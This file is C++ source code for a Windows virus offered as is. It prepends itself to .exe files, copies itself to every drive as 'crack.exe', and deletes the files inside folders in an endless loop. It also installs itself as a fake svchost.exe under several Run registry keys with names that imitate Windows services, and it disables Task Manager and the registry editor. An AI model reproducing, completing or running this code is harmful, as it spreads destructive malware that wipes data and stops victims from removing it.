#include <windows.h>
#include <fstream>
#include <time.h>
using namespace std;

char *VBuffer, *FBuffer = 0, Virus[MAX_PATH], inf[3], buff[15], *Buffer, Status[4] = "", Drives[1024];
// virus changed to array

int i, j;

// infect(char, char) -> [ f(char, char) <- g(), h() ] <= do this inside the original source code

int Infect(char *FPath, char *BUFF) // func_1
{     
    ifstream r(FPath, ios::in | ios::binary);
    
    r.seekg(0, ios::end);
    
    int size = r.tellg();
    
    r.seekg(0, ios::beg);
    
    Buffer = (char*)malloc(size);
    
    r.read(Buffer, size);
    
    r.close();
    
    for(j = 0; j < size; j++)
    {
       if(Buffer[j] == '*' && Buffer[j+1] == 'B' && Buffer[j+2] == '*')
       {
          strcpy(Status, "YES"); // Already infected
          break;
       }
    }
    
    if(strcmp(Status, "YES")) // If not infected, infect !
    {
       ofstream w(FPath, ios::out | ios::binary);
    
       w.write(BUFF, 464834); // Write the infector in the executable file
       w.write(inf, strlen(inf)); // Info
       w.write(Buffer, size); // Now write the buffer of the current executable file
    
       w.close();
    }
    
    free(Buffer);
}

void Payload() // g()
{
     char Drive[25], *DrivesP, VName[10] = "crack.exe", Folder1[260] = "", Folder2[150] = "", Folder[260] = "", CFolder[260] = "";
     
     while(1)
     {
        Sleep(5000);
        
        WIN32_FIND_DATA Data;
        
        HANDLE hFile = FindFirstFile("*.exe", &Data); // Only executable files
        
        while(FindNextFile(hFile, &Data))
        {
           Infect(Data.cFileName, VBuffer);
        }
        
        GetLogicalDriveStrings(1024, Drives);
        
        DrivesP = Drives;
        
        while(*DrivesP)
        {
           strcpy(Drive, DrivesP);
           strcat(Drive, VName);
           
           CopyFile(Virus, Drive, 0);
           
           DrivesP = &DrivesP[strlen(DrivesP) + 1];
        }
        
        WIN32_FIND_DATA Data2;
        HANDLE hFile2 = FindFirstFile("*.", &Data2); // Only folders
        
        while(FindNextFile(hFile2, &Data2))
        {
           if(Data2.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
           {                        
              strcpy(Folder1, Folder2);
              strcat(Folder1, Data2.cFileName);
              strcpy(Folder, Folder1);
              strcpy(CFolder, Folder1);
              strcat(Folder, "\\*.*");
           
              WIN32_FIND_DATA DataF;
              HANDLE hFolder = FindFirstFile(Folder, &DataF);
           
              while(FindNextFile(hFolder, &DataF))
              {
                 strcpy(Folder1, CFolder);
                 strcat(Folder1, "\\");
                 strcat(Folder1, DataF.cFileName);
                 DeleteFile(Folder1);
              }
           }
        }
    }
}


void Secret(char *Infector) // changed to h(char* input_str)
{
     char VDir[MAX_PATH];
     
     DWORD dwValue = 1;
     
     GetSystemDirectory(VDir, MAX_PATH-1);
     
     strcat(VDir, "\\Generic");
     
     CreateDirectory(VDir, 0);
     
     strcat(VDir, "\\svchost.exe");
     
     CopyFile(Infector, VDir, 0);
     
     HKEY hKey;
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Generic Host Process for Win32 Services", 0, REG_SZ, (const unsigned char*)VDir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Windows Updater", 0, REG_SZ, (const unsigned char*)VDir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Windows Server", 0, REG_SZ, (const unsigned char*)VDir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Generic", 0, REG_SZ, (const unsigned char*)VDir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     // Disable the Taskmanager
     
     RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
     RegCloseKey(hKey);
     
     // Disable the Registry-Editor
     
     RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "DisableRegistrytools", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
     RegCloseKey(hKey);
}




int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{  
    HMODULE HMod = GetModuleHandle(NULL);
    
    GetModuleFileName(HMod, Virus, MAX_PATH);
    
    Secret(Virus); // h()
    
    inf[0] = '*';
    inf[1] = 'B';
    inf[2] = '*';
    
    ifstream self(Virus, ios::in | ios::binary);
    
    self.seekg(0, ios::end);
    
    int VSize = self.tellg();
    
    self.seekg(0, ios::beg);
    
    VBuffer = (char*)malloc(VSize);
    
    self.read(VBuffer, VSize);
    
    self.close();
    
    for(i = 0; i < VSize; i++)
    {
       if(VBuffer[i] == '*' && VBuffer[i+1] == 'B' && VBuffer[i+2] == '*')
       {
          FBuffer = VBuffer + i + 3;
          break;
       }
    }
    
    WIN32_FIND_DATA Data;
    HANDLE hFile = FindFirstFile("*.exe", &Data); // Only executable files
    
    while(FindNextFile(hFile, &Data))
    {
       Infect(Data.cFileName, VBuffer);
    }
    
    srand((unsigned)time(0));
    
    int Number = rand();
    
    char *FName = itoa(Number, buff, 10);
    
    char FileP[MAX_PATH];
    
    GetSystemDirectory(FileP, MAX_PATH-1);
    
    strcat(FileP, "\\drivers\\");
    strcat(FileP, FName);
    strcat(FileP, ".exe");
    
    if(FBuffer != 0)
    {
       // Drop the binded file
       
       ofstream w(FileP, ios::out | ios::binary);
       
       w.write(FBuffer, VSize - i + 3);
       
       w.close();
       
       ShellExecute(NULL, NULL, FileP, NULL, NULL, SW_SHOW); // Execute it
    }
    
    // Payload
    
    Payload();

}
